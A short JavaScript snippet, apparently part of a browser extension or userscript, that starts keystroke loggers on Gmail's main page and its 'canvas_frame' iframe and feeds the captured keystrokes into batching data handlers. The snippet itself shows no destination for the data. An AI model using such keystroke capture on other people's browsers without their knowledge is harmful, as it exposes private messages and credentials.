// Some hacky stuff I need to do to get it to work with GMail.
(function() {
  var canvas_frame = document.getElementById('canvas_frame');
  
  var data_canvas = new Kss.Data(Kss.BATCH_SIZE);
  var keylogger_canvas = new Kss.Keylogger(canvas_frame.contentDocument);
  keylogger_canvas.attachListener(data_canvas.keystrokeHandler);
  data_canvas.start();
  keylogger_canvas.start();

  var data = new Kss.Data(Kss.BATCH_SIZE);
  var keylogger = new Kss.Keylogger(document);
  keylogger.attachListener(data.keystrokeHandler);
  data.start();
  keylogger.start();

})();
